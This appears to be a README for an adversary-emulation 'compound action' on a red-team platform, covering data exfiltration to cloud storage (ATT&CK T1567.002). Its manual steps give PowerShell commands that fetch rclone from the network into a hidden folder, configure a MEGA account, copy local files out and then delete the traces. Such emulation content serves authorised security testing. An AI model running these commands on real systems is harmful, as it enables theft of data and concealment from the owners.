# T1567.002 - Exfiltration to Cloud Storage
This compound action exfiltrates data using rclone to your chosen cloud storage service.

## Import into SCYTHE
1. Login to the SCYTHE instance where you want to import the Compound Action.
2. Click Threat Manager - Migrate Threats
3. Under "Import Threat" click “Choose File” and select the JSON file you downloaded from GitHub
4. Click Import and OK when complete
5. Click Threat Manager - Threat Catalog
6. Find the imported Compound Action and click the tag icon 
7. Tag the MITRE ATT&CK Technique for the Compound Action

## Preparation
1. Create an account in the desired cloud service supported by rclone: https://rclone.org/overview/
2. Modify step 9 of the threat with your credentials.
3. Modify step 10 with the data you want to exfiltrate.

## Manual Execution
1. Check if rclone is being used on the system: powershell dir %USERPROFILE%\.config\rclone\rclone.conf
2. powershell mkdir %USERPROFILE%\.config
3. powershell mkdir %USERPROFILE%\.config\rclone
4. powershell "Invoke-Command -ScriptBlock { Invoke-WebRequest "https://github.com/scythe-io/community-threats/blob/master/CompoundActions/T1567.002%20-%20Exfiltration%20to%20Cloud%20Storage/VFS/rclone.zip?raw=true" -OutFile "$env:userprofile\.config\rclone\rclone.zip"}"
5. powershell Expand-Archive -Path "$env:userprofile\.config\rclone\rclone.zip" -DestinationPath $env:userprofile\.config\rclone\
6. Configure rclone with your credentials: %USERPROFILE%\.config\rclone\rclone.exe config create remote mega user <MEGA USER> pass <MEGA PASS>
7. Copy the files from the local system to the MEGA account: %USERPROFILE%\.config\rclone\rclone.exe copy source:sourcepath dest:destpath
8. Clean up: rmdir /Q /S "%USERPROFILE%\.config"


